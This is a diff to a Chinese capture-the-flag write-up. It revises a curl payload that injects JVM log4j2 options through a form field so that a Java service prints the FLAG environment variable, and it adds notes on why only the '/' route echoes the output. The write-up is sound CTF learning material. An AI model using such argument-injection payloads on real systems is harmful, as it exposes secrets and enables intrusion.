@@ -256,5 +256,27 @@ java_command = [
 
 所以最后payload：
 ```bash
-curl -X POST  http://challenge.ilovectf.cn:30285/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} sun"
+curl -X POST  http://challenge.ilovectf.cn:30295/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} "
 ```
+
+最后有点疑惑是为什么不能打`/chat`路由，试了一下日志都不能回显
+好像是因为`/chat`路由：
+```python
+result = chat(cmd, arg)
+
+out = result.get('stdout', '').strip()
+    err = result.get('stderr', '').strip()
+
+    return out 
+```
+而`/`路由：
+```python
+result = chat(cmd, text)
+        return result.get('stdout', '') + result.get('stderr', '')
+```
+而有一个规则是
+```java
+LOGGER.info(...)  →  stderr
+System.out.println(...) → stdout
+```
+所以我们这里打`/`路由
